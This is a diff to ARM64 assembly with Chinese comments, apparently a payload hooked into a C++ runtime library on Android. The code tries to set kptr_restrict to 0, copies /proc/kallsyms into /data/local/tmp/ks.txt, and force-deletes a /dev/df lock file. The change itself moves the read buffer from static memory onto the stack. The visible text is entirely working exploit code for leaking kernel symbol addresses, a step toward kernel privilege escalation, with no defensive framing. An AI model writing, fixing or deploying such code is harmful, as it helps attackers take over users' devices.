@@ -22,9 +22,6 @@ kallsyms_file:
     .asciz "/proc/kallsyms"
 dump_file:
     .asciz "/data/local/tmp/ks.txt"
-    .balign 8
-read_buf:
-    .skip 4096, 0
     .balign 4
 
     .global libcxx_ko_target_off
@@ -85,6 +82,9 @@ libcxx_start:
     cbnz    w0, return          
 
 worker:
+    // 为缓冲区分配 1024 字节栈空间 (16字节对齐)
+    sub     sp, sp, 1024
+
     // 5. 尝试修改 kptr_restrict 为 0
     mov     x0, -100
     adr     x1, kptr_file
@@ -126,20 +126,20 @@ open_kallsyms:
     mov     x21, x0  
 
 read_loop:
-    // 8. read()
+    // 8. read(fd, sp, 1024)
     mov     x0, x20
-    adr     x1, read_buf
-    movl    x2, 4096
+    mov     x1, sp           // 使用 sp 作为缓冲区
+    movl    x2, 1024
     mov     x8, #SYS_read
     svc     0
     
     cmp     w0, #0
     b.le    close_dump
 
-    // 9. write()
+    // 9. write(fd, sp, w0)
     mov     x22, x0
     mov     x0, x21
-    adr     x1, read_buf
+    mov     x1, sp
     mov     x2, x22
     mov     x8, #SYS_write
     svc     0
@@ -157,7 +157,10 @@ close_kallsyms:
     svc     0
 
 cleanup_df:
-    // 10. 无论如何，强制删除 /dev/df
+    // 恢复缓冲区栈指针！
+    add     sp, sp, 1024
+
+    // 10. 强制删除 /dev/df
     mov     x0, -100
     adr     x1, mutex_file
     mov     x8, #SYS_unlinkat
